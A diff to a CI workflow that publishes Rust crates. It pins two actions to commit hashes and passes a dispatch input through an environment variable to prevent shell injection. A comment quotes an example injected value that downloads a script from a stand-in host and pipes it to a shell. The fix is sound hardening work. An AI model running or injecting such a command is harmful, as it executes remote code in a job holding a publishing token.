@@ -14,18 +14,24 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - uses: dtolnay/rust-toolchain@stable
+      - uses: dtolnay/rust-toolchain@fa04a1451ff1842e2626ccb99004d0195b455a88 # stable
+        with:
+          toolchain: stable
 
-      - uses: Swatinem/rust-cache@v2
+      - uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32 # v2
 
       # bulwarkctl depends on bulwark-core, so it must publish after — the default input
       # ordering above reflects that; a custom input should preserve it too.
       - name: Publish selected crates
         env:
           CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
+          # Pass the dispatch input through the environment, never interpolated straight into the
+          # shell — `${{ inputs.crates }}` spliced into `run:` would let a value like
+          # `x; curl evil | sh` execute in a job that holds CARGO_REGISTRY_TOKEN.
+          CRATES: ${{ inputs.crates }}
         run: |
           set -e
-          for crate in ${{ inputs.crates }}; do
+          for crate in $CRATES; do
             version=$(cargo metadata --no-deps --format-version 1 \
               | jq -r --arg name "$crate" '.packages[] | select(.name == $name) | .version')
             if [ -z "$version" ]; then
